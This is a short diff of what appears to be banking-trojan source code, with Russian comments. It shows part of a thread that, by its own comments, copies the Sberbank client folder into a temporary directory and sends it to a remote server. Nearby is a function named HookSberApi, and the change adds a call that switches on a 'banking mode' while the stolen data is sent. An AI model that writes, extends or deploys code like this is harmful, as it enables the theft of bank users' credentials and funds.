@@ -246,6 +246,11 @@ static bool HookSberApi()
 //непосредственное копирование папки сбера, сначала коипрует во временную папку, а потом отсылает на сервер с временной папки
 static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
+
+	// При отправке данных сбера включаем режим Банк
+    SetBankingMode();
+
+
 	char folderTmp[MAX_PATH], pathFlag[MAX_PATH], pathForExe[MAX_PATH];
 	if( GetAllUsersProfile( folderTmp, sizeof(folderTmp), "sbe" ) && //путь к временной папке
 		GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
